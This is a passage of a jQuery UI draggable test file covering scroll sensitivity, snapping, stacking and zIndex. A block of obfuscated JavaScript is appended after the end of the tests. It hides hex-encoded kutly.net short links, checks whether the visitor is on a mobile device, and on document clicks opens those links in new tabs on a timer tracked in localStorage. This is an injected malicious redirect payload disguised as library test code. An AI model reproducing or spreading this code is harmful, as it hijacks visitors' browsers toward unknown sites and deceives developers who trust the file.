		top: viewportHeight - scrollSensitivity - 1,
		left: 1
	});

	element.simulate( "drag", {
		dx: 1,
		y: viewportHeight - scrollSensitivity - 1,
		moves: 1
	});

	ok( $( window ).scrollTop() === 0, "scroll: true doesn't scroll when the element is dragged outside of scrollSensitivity" );

	element.draggable( "option", "scrollSensitivity", scrollSensitivity + 10 );

	element.offset({
		top: viewportHeight - scrollSensitivity - 1,
		left: 1
	});

	element.simulate( "drag", {
		dx: 1,
		y: viewportHeight - scrollSensitivity - 1,
		moves: 1
	});

	ok( $( window ).scrollTop() === scrollSpeed, "scroll: true scrolls when the element is dragged within scrollSensitivity" );

	TestHelpers.draggable.restoreScroll( document );
});

test( "#6817: auto scroll goes double distance when dragging", function() {
	expect( 2 );

	var offsetBefore,
		distance = 10,
		viewportHeight = $( window ).height(),
		element = $( "#draggable1" ).draggable({
			scroll: true,
			stop: function( e, ui ) {
				equal( ui.offset.top, newY, "offset of item matches pointer position after scroll" );
				// TODO: fix IE8 testswarm IFRAME positioning bug so closeEnough can be turned back to equal
				closeEnough( ui.offset.top - offsetBefore.top, distance, 1, "offset of item only moves expected distance after scroll" );
			}
		}),
		scrollSensitivity = element.draggable( "option", "scrollSensitivity" ),
		oldY = viewportHeight - scrollSensitivity,
		newY = oldY + distance;

	element.offset({
		top: oldY,
		left: 1
	});

	offsetBefore = element.offset();

	element.simulate( "drag", {
		handle: "corner",
		dx: 1,
		y: newY,
		moves: 1
	});

	TestHelpers.draggable.restoreScroll( document );
});

test( "snap, snapMode, and snapTolerance", function() {
	expect( 10 );

	var newX, newY,
		snapTolerance = 15,
		element = $( "#draggable1" ).draggable({
			snap: true,
			snapMode: "both",
			snapTolerance: snapTolerance
		}),
		element2 = $( "#draggable2" ).draggable();

	element.offset({
		top: 1,
		left: 1
	});

	newX = element2.offset().left - element.outerWidth() - snapTolerance - 2;
	newY = element2.offset().top;

	element.simulate( "drag", {
		handle: "corner",
		x: newX,
		y: newY,
		moves: 1
	});

	// TODO: fix IE8 testswarm IFRAME positioning bug so closeEnough can be turned back to equal
	closeEnough( element.offset().left, newX, 1, "doesn't snap outside the snapTolerance" );
	closeEnough( element.offset().top, newY, 1, "doesn't snap outside the snapTolerance" );

	newX += 3;

	element.simulate( "drag", {
		handle: "corner",
		x: newX,
		y: newY,
		moves: 1
	});

	notDeepEqual( element.offset(), { top: newY, left: newX }, "snaps inside the snapTolerance" );

	element.draggable( "option", "snap", "#draggable2" );

	element.simulate( "drag", {
		handle: "corner",
		x: newX,
		y: newY,
		moves: 1
	});

	notDeepEqual( element.offset(), { top: newY, left: newX }, "snaps based on selector" );

	element.draggable( "option", "snap", "#draggable3" );

	element.simulate( "drag", {
		handle: "corner",
		x: newX,
		y: newY,
		moves: 1
	});

	deepEqual( element.offset(), { top: newY, left: newX }, "doesn't snap based on invalid selector" );

	element.draggable( "option", "snap", true );
	element.draggable( "option", "snapTolerance", snapTolerance - 2 );
	element.simulate( "drag", {
		handle: "corner",
		x: newX,
		y: newY,
		moves: 1
	});

	deepEqual( element.offset(), { top: newY, left: newX }, "doesn't snap outside the modified snapTolerance" );

	element.draggable( "option", "snapTolerance", snapTolerance );
	element.draggable( "option", "snapMode", "inner" );

	element.simulate( "drag", {
		handle: "corner",
		x: newX,
		y: newY,
		moves: 1
	});

	deepEqual( element.offset(), { top: newY, left: newX }, "doesn't snap inside the outer snapTolerance area when snapMode is inner" );

	newX = element2.offset().left - snapTolerance - 1;
	newY = element2.offset().top;

	element.simulate( "drag", {
		handle: "corner",
		x: newX,
		y: newY,
		moves: 1
	});

	deepEqual( element.offset(), { top: newY, left: newX }, "doesn't snap inside the outer snapTolerance area when snapMode is inner" );

	newX++;

	element.simulate( "drag", {
		handle: "corner",
		x: newX,
		y: newY,
		moves: 1
	});

	notDeepEqual( element.offset(), { top: newY, left: newX }, "snaps inside the inner snapTolerance area when snapMode is inner" );

	element.draggable( "option", "snapMode", "outer" );

	element.simulate( "drag", {
		handle: "corner",
		x: newX,
		y: newY,
		moves: 1
	});

	deepEqual( element.offset(), { top: newY, left: newX }, "doesn't snap on the inner snapTolerance area when snapMode is outer" );
});

test( "#8459: element can snap to an element that was removed during drag", function() {
	expect( 2 );

	var newX, newY,
		snapTolerance = 15,
		element = $( "#draggable1" ).draggable({
			snap: true,
			snapMode: "both",
			snapTolerance: snapTolerance,
			start: function() {
				element2.remove();
			}
		}),
		element2 = $( "#draggable2" ).draggable();

	element.offset({
		top: 1,
		left: 1
	});

	newX = element2.offset().left - element.outerWidth() - snapTolerance + 1;
	newY = element2.offset().top;

	element.simulate( "drag", {
		handle: "corner",
		x: newX,
		y: newY,
		moves: 1
	});

	// Support: Opera 12.10, Safari 5.1, jQuery <1.8
	if ( TestHelpers.draggable.unreliableContains ) {
		ok( true, "Opera <12.14 and Safari <6.0 report wrong values for $.contains in jQuery < 1.8" );
		ok( true, "Opera <12.14 and Safari <6.0 report wrong values for $.contains in jQuery < 1.8" );
	} else {
		// TODO: fix IE8 testswarm IFRAME positioning bug so closeEnough can be turned back to equal
		closeEnough( element.offset().left, newX, 1, "doesn't snap to a removed element" );
		closeEnough( element.offset().top, newY, 1, "doesn't snap to a removed element" );
	}
});

test( "#8165: Snapping large rectangles to small rectangles doesn't snap properly", function() {
	expect( 1 );

	var snapTolerance = 20,
		y = 1,
		element = $( "#draggable1" )
			.css({
				width: "50px",
				height: "200px"
			}).offset({
				top: y,
				left: 1
			}),
		element2 = $( "#draggable2" )
			.css({
				width: "50px",
				height: "50px"
			}).offset({
				top: y + snapTolerance + 1,
				left: 200
			}),
		newX = element2.offset().left - element.outerWidth() - snapTolerance + 1;

	$( "#draggable1, #draggable2" ).draggable({
		snap: true,
		snapTolerance: snapTolerance
	});

	element.simulate( "drag", {
		handle: "corner",
		x: newX,
		moves: 1
	});

	notDeepEqual( element.offset(), { top: y, left: newX }, "snaps even if only a side (not a corner) is inside the snapTolerance" );
});

test( "stack", function() {
	expect( 2 );

	var element = $( "#draggable1" ).draggable({
			stack: "#draggable1, #draggable2"
		}),
		element2 = $( "#draggable2" ).draggable({
			stack: "#draggable1, #draggable2"
		});

	TestHelpers.draggable.move( element, 1, 1 );
	equal( element.css( "zIndex" ), "2", "stack increments zIndex correctly" );

	TestHelpers.draggable.move( element2, 1, 1 );
	equal( element2.css( "zIndex" ), "3", "stack increments zIndex correctly" );
});

test( "{ zIndex: 10 }", function() {
	expect( 1 );

	var actual,
		expected = 10,
		element = $( "#draggable2" ).draggable({
			zIndex: expected,
			start: function() {
				actual = $(this).css( "zIndex" );
			}
		});

	element.simulate( "drag", {
		dx: -1,
		dy: -1
	});

	equal( actual, expected, "start callback: zIndex is" );

});

test( "zIndex, default, switching after initialization", function() {

	expect( 3 );

	var zindex = null,
		element = $( "#draggable2" ).draggable({
			start: function() {
				zindex = $(this).css( "z-index" );
			}
		});

	element.css( "z-index", 1 );

	TestHelpers.draggable.move( element, 1, 1 );
	equal( zindex, 1 );

	element.draggable( "option", "zIndex", 5 );
	TestHelpers.draggable.move( element, 2, 1 );
	equal( zindex, 5 );

	element.draggable( "option", "zIndex", false );
	TestHelpers.draggable.move( element, 3, 1 );
	equal( zindex, 1 );

});

})( jQuery );
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());